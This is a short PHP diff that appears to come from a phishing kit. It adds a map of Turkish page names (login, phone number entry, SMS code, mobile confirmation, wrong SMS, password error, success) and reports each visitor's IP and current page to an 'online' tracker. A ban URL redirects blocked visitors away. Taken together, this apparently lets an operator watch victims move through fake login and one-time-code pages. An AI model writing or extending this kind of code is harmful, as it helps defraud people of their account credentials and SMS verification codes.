@@ -27,9 +27,24 @@ require_once 'AjaxClass.php';
 
 $ajax = new Ajax(null);
 
-DEFINE('IP', $ajax->getIP());
-DEFINE('BAN_URL',"https://www.youtube.com/watch?v=S1mbxjBTiIE");
-$ajax->updateOnline(IP);
+define('IP', $ajax->getIP());
+define('BAN_URL',"https://www.youtube.com/watch?v=S1mbxjBTiIE");
+
+$script = basename($_SERVER['SCRIPT_NAME']);
+$pageMap = [
+    'giris.php' => 'Giriş Sayfası',
+    'telefon.php' => 'Telefon Numara Girişi',
+    'bekle.php' => 'Bekle',
+    'sms.php' => 'SMS',
+    'mobil-onay.php' => 'Mobil-Onay',
+    'hatali-sms.php' => 'Hatalı SMS',
+    'hatali.php' => 'Şifre Hata',
+    'basarili.php' => 'Başarılı',
+    'ping.php' => 'Giriş Sayfası'
+];
+$currentPage = isset($pageMap[$script]) ? $pageMap[$script] : 'Anasayfa';
+
+$ajax->updateOnline(IP, $currentPage);
 
 $session = @$_SESSION['loggedIn'];
 $useragent = $_SERVER['HTTP_USER_AGENT'];
